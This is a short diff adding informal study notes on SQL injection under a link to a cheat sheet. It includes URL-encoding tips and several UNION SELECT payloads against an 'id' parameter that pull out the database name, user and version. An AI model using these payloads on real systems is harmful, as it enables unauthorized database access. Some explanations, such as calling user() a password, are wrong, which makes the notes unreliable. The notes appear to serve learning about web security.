@@ -1,1 +1,12 @@
 https://portswigger.net/web-security/sql-injection/cheat-sheet 
+' = %27 //url Incoding
+--+     //+ prevent Syntax error  e.g., MySQL require whitespace after --, so the + ensures that space in a URL and prevents syntax errors.
+Ex:- /?id=1' union all select 1,2,3 --+ // union is not exectuing id=1 is Executing
+     /?id=-1' union all select 1,2,3 --+ // adding -to 1 , 1 is Deligable 
+
+EX:- /id=-1' union all select 1,database(),user() --+  //database() :- display name , user :- password 
+use \ to know that ' it is present or not
+Ex:- /id=-1 union all select 1,version(),user() --+
+
+
+
